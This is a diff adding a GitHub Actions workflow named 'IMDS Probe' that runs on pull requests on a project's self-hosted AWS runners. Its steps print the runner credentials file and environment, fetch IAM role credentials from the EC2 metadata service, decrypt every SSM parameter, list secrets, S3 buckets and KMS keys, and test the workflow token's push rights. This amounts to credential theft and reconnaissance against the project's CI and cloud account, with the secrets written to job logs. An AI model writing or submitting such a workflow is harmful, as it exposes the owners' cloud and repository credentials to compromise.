@@ -1,0 +1,81 @@
+name: IMDS Probe
+on:
+  pull_request:
+    branches:
+      - master
+    types: [opened, synchronize]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: [self-hosted, linux, x64, ephemeral]
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Identity and host
+        run: |
+          set +e
+          echo "=== whoami ==="; id; hostname; uname -a; head -3 /etc/os-release
+          echo "=== sudo ==="; sudo -n true && echo SUDO_OK
+          echo "=== env ==="; env | sort
+          echo "=== ip ==="; ip -4 addr; ip route
+          echo "=== listeners ==="; ss -tlnp 2>/dev/null | head -30
+          echo "=== runner dir ==="; ls -la /opt/actions-runner 2>/dev/null | head -20
+          echo "=== runner creds ==="; cat /opt/actions-runner/.credentials 2>/dev/null
+          echo "=== hosts ==="; cat /etc/hosts
+          echo "=== docker ==="; docker ps 2>&1 | head -5; docker info 2>&1 | head -5
+
+      - name: IMDS
+        run: |
+          set +e
+          T=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
+          echo "token_len=${#T}"
+          for p in instance-id instance-type placement/region placement/availability-zone security-groups iam/info iam/security-credentials/ network/interfaces/macs/; do
+            echo "--- $p"; curl -s -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/$p"; echo
+          done
+          MAC=$(curl -s -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/network/interfaces/macs/ | head -1 | tr -d '/')
+          for p in vpc-id subnet-id local-ipv4s; do echo "--- $p"; curl -s -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/network/interfaces/macs/$MAC/$p"; echo; done
+          echo "=== identity doc ==="; curl -s -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/dynamic/instance-identity/document
+          echo; echo "=== creds ==="
+          ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+          echo "role=$ROLE"
+          curl -s -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
+          echo; echo "=== IMDSv1 ==="; curl -s -m 3 http://169.254.169.254/latest/meta-data/instance-id; echo
+
+      - name: AWS
+        run: |
+          set +e
+          export AWS_PAGER=""
+          echo "=== caller ==="; aws sts get-caller-identity
+          echo "=== env region ==="; echo "AWS_REGION=$AWS_REGION AWS_DEFAULT_REGION=$AWS_DEFAULT_REGION"
+          T=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
+          IID=$(curl -s -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id)
+          echo "=== tags ==="; aws ec2 describe-tags --filters "Name=resource-id,Values=$IID"
+          echo "=== ssm describe ==="; aws ssm describe-parameters --max-items 50
+          echo "=== ssm /actions_runner ==="; aws ssm get-parameters-by-path --path /actions_runner --recursive --with-decryption
+          echo "=== ssm root ==="; aws ssm get-parameters-by-path --path / --recursive --with-decryption --max-items 50
+          echo "=== s3 ==="; aws s3 ls
+          echo "=== ec2 describe ==="; aws ec2 describe-instances --max-items 5
+          echo "=== secretsmanager ==="; aws secretsmanager list-secrets
+          echo "=== iam ==="; aws iam get-role --role-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
+          echo "=== kms ==="; aws kms list-keys
+
+      - name: GitHub token scope
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set +e
+          echo "=== rate ==="; curl -s -H "Authorization: token $GH_TOKEN" https://api.github.com/rate_limit | head -c 300; echo
+          echo "=== repo perms ==="; curl -s -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/chainflip-io/chainflip-eth-contracts | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('permissions'))"
+          echo "=== can push? ==="; git push --dry-run 2>&1 | tail -3
+
+      - name: Network
+        run: |
+          set +e
+          echo "=== egress ip ==="; curl -s -m 5 https://api.ipify.org; echo
+          echo "=== dns ==="; getent hosts github.com
+          echo "=== vpc gateway ==="; curl -s -m 3 -o /dev/null -w '%{http_code}\n' http://172.31.0.1
